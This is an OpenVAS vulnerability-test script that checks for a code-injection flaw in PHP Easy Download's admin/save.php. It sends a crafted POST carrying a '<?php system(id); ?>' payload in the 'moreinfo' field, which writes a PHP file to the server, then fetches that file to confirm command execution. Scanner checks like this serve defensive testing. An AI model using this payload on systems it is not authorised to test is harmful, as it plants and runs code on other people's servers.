# OpenVAS Vulnerability Test
# $Id: phpeasydownload_code_injection.nasl 4489 2016-11-14 08:23:54Z teissa $
# Description: PHP Easy Download admin/save.php Paramater Code Injection Vulnerability
#
# Authors:
# Justin Seitz <jms@bughunter.ca>
#
# Copyright:
# Copyright (C) 2006 Justin Seitz
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "The remote web server contains a PHP script that is affected by a
remote code execution issue. 

Description:

The version of PHP Easy Download installed on the remote host fails to
sanitize input to the 'moreinfo' parameter before using it in the
'save.php' script.  By sending a specially-crafted value, an attacker
can store and execute code at the privilege level of the remote web
server.";

tag_solution = "Unknown at this time.";


if(description)
{
 
	# set script identifiers

	script_id(80076);;
	script_version("$Revision: 4489 $");
	script_tag(name:"last_modification", value:"$Date: 2016-11-14 09:23:54 +0100 (Mon, 14 Nov 2016) $");
	script_tag(name:"creation_date", value:"2008-10-24 23:33:44 +0200 (Fri, 24 Oct 2008)");
    script_tag(name:"cvss_base", value:"7.5");
    script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

        script_bugtraq_id(21179);

	name = "PHP Easy Download admin/save.php Paramater Code Injection Vulnerability";
	summary = "Tries to inject PHP code into remote web server.";
	family = "Web application abuses";

	script_name(name);

	script_category(ACT_DESTRUCTIVE_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
	script_copyright("This script is Copyright (C) 2006 Justin Seitz");

	script_family(family);

	script_dependencies("http_version.nasl");
	script_require_ports("Services/www", 80);
	script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 script_xref(name : "URL" , value : "http://www.milw0rm.com/exploits/2812");
	exit(0);
}



include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("url_func.inc");

port = get_http_port(default:80);

#
#
#	Verify we can talk to the web server, if not exit
#
#

if(!get_port_state(port)) exit(0);
if(!can_host_php(port:port)) exit(0);


# Loop through directories.
dirs = make_list("/easydownload","/phpeasydownload","/download", cgi_dirs());

#
#
#	Craft the PHP code to inject, we are going to execute the bash id command.
#
#

filename = string(SCRIPT_NAME,"-",unixtime(),".php");
cmd = "id";
code = urlencode(str:string('<?php system(', cmd, "); ?>"));

#
#
#	Now let's send the request to the script.
#
#
foreach dir (dirs) {

  url = string(dir,"/file_info/admin/save.php");
  req = http_get(item:url, port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
  if (res == NULL) exit(0);

  if ("# of Accesses:" >< res) {
    data = string("description=0&moreinfo=",code,"&accesses=0&filename=",filename,"&date=&B1=Submit");
    attackreq = http_post(port:port, item:url, data:data);
    attackreq = ereg_replace(string:attackreq, pattern:"Content-Length: ", replace: string("Content-Type: application/x-www-form-urlencoded\r\nContent-Length: "));
    attackres = http_keepalive_send_recv(port:port,data:attackreq,bodyonly:TRUE);
    if (attackres == NULL) exit(0);

    #
    #
    #	Check the file we just uploaded for our random string we generated.
    #
    #
    http_check_remote_code(
      unique_dir:dir,
      check_request:string("/file_info/descriptions/",filename,".0"),
      check_result:"uid=[0-9]+.*gid=[0-9]+.*",
      command:"id",
      port:port
    );
  }
}
